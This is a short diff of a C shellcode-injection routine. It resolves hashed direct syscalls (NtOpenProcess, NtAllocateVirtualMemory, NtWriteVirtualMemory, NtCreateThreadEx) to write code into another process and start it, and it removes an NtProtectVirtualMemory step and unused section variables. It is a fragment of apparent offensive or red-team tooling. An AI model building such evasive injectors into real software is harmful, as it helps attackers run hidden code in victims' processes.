@@ -97,7 +97,6 @@ int Injection(int pid, unsigned char* sc_ptr, SIZE_T sc_len)
     Syscall sysNtOpenProcess = { 0x0 }; 
     Syscall sysNtAllocateVirtualMemory = { 0x0 };
     Syscall sysNtWriteVirtualMemory = { 0x0 };
-    Syscall sysNtProtectVirtualMemory = { 0x0 };
     Syscall sysNtCreateThreadEx = { 0x0 };
     
     DWORD dwSuccess = FAIL;
@@ -114,10 +113,6 @@ int Injection(int pid, unsigned char* sc_ptr, SIZE_T sc_len)
     if (dwSuccess == FAIL)
         return 0x01;
 
-    dwSuccess = getSyscall(0x496b218c, &sysNtProtectVirtualMemory);
-    if (dwSuccess == FAIL)
-        return 0x01;
-
     dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
     if (dwSuccess == FAIL)
         return 0x01;
@@ -128,10 +123,6 @@ int Injection(int pid, unsigned char* sc_ptr, SIZE_T sc_len)
     SIZE_T            wr;
     CLIENT_ID         cid = { 0 };
     OBJECT_ATTRIBUTES oa = { sizeof(oa) };
-    DWORD oldprotect = 0;
-    LARGE_INTEGER sectionSize = { sc_len };
-    HANDLE sectionHandle = NULL;
-    PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;
 
     cid.UniqueProcess = (PVOID)pid;
 
